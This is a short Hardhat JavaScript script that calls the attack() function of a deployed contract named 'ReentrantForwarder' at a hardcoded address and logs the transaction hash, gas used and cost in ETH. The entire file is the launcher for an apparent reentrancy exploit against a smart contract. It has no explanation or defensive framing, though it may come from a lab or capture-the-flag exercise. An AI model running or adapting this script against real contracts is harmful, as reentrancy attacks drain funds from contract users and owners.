const hre = require('hardhat');

async function main(){
  const attackerAddress = '0x0DaFab9F304Aea20fDD8DCE062Dd9bBB01D7b7a9';
  const [signer] = await hre.ethers.getSigners();
  console.log('Using signer', signer.address);
  const attacker = await hre.ethers.getContractAt('ReentrantForwarder', attackerAddress, signer);
  const provider = hre.ethers.provider;
  const nextNonce = await provider.getTransactionCount(signer.address, 'latest');
  console.log('Using nonce', nextNonce);
  const tx = await attacker.attack({ nonce: nextNonce });
  console.log('Tx hash:', tx.hash);
  const receipt = await tx.wait();
  console.log('Confirmed. GasUsed:', receipt.gasUsed.toString());
  const gasPrice = receipt.effectiveGasPrice || (await provider.getGasPrice());
  const cost = gasPrice.mul(receipt.gasUsed);
  console.log('GasPrice:', gasPrice.toString());
  console.log('Cost ETH:', hre.ethers.utils.formatEther(cost));
}

main().catch(e=>{ console.error(e); process.exit(1); });
